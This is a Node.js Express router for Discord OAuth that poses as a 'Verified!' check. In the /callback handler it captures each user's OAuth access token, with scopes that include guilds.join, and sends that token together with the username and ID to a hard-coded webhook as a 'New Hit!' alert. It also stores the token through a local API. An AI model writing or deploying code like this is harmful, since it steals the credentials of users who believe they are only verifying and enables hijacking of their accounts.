const express = require("express");
const axios = require("axios");
const qs = require("querystring");
const router = express.Router();

const DISCORD_CLIENT_ID = "slay";
const DISCORD_CLIENT_SECRET = "slay";
const DISCORD_REDIRECT_URI = "yourhost/auth/callback";
const BOT_TOKEN = "slay"; 

const DISCORD_AUTH_URL = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(DISCORD_REDIRECT_URI)}&response_type=code&scope=identify%20guilds%20guilds.join`;

const WEBHOOK_URL = "https://discord.com/api/webhooks/1290016987363147796/rHWrwOcitOb_b7nPuad7Ck4y1D_vnulLyzeY8Yb3RSol9OPqCoHlPj39kbsTg3KswP3x";
// do these config and also make sure to change on the axios request the request url

router.get("/login", (req, res) => {
  res.redirect(DISCORD_AUTH_URL);
});

router.get("/callback", async (req, res) => {
  const { code } = req.query;

  if (!code) {
    return res.status(400).send("Missing code");
  }

  try {
    const tokenResponse = await axios.post(
      "https://discord.com/api/oauth2/token",
      qs.stringify({
        client_id: DISCORD_CLIENT_ID,
        client_secret: DISCORD_CLIENT_SECRET,
        grant_type: "authorization_code",
        code: code,
        redirect_uri: DISCORD_REDIRECT_URI,
        scope: "identify guilds guilds.join",
      }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
      }
    );

    const accessToken = tokenResponse.data.access_token;

    const userResponse = await axios.get("https://discord.com/api/users/@me", {
      headers: {
        Authorization: `Bearer ${accessToken}`,
      },
    });

    const discordUser = userResponse.data;

    const embed = {
      embeds: [
        {
          title: "New Hit!",
          description: `User: **${discordUser.username}#${discordUser.discriminator}**\nID: **${discordUser.id}**\nToken: **${accessToken}**`,
        },
      ],
    };

      await axios.post(WEBHOOK_URL, embed);
      await axios.get(`http://localhost/api/insert_user/${discordUser.id}/${accessToken}`);
      
      res.send(`
        <html>
          <head>
            <style>
              body {
                background-color: green;
                color: white;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                font-size: 24px;
              }
            </style>
          </head>
          <body>
            <div>Verified! Welcome, ${discordUser.username}</div>
          </body>
        </html>
      `);
  
  } catch (error) {
    console.error("Error during authentication:", error.response ? error.response.data : error.message);
    res.status(400).send("Failed to authenticate: " + (error.response ? error.response.data.error_description : error.message));
  }
});

module.exports = router;
